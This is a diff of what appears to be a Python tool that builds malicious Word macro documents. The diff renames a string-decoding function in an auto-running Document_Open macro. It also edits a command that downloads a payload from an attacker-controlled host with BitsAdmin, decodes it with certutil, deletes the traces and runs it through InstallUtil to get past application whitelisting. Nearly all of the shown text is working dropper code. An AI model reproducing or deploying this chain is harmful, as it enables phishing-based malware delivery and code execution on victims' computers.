@@ -28,7 +28,7 @@ End Function
 Sub MyMacro()
     Dim Apples As String
     Dim Water As String
-    If ActiveDocument.Name <> Nuts("{DOC_NAME}") Then
+    If ActiveDocument.Name <> Rats("{DOC_NAME}") Then
         Exit Sub
     End If
 
@@ -45,7 +45,7 @@ Sub Document_Open()
     MyMacro
 End Sub
 """
-CMD = f"cmd.exe /c BitsAdmin /Transfer myJob http://{ak.LHOST}/Bypass.txt C:\\Windows\\tasks\\bp.txt && certutil -f -decode C:\\Windows\\tasks\\bp.txt C:\\Windows\\tasks\\bp && del C:\\Windows\\tasks\\bp.txt && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\bp"
+CMD = f"cmd.exe /c BitsAdmin /Transfer myJob http://{ak.LHOST}/Bypass.txt C:\\Windows\\tasks\\bp.txt && certutil -f -decode C:\\Windows\\tasks\\bp.txt C:\\Windows\\tasks\\bp && del C:\\Windows\\tasks\\bp.txt && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\bp"
 
 
 def encrypt_string(text):
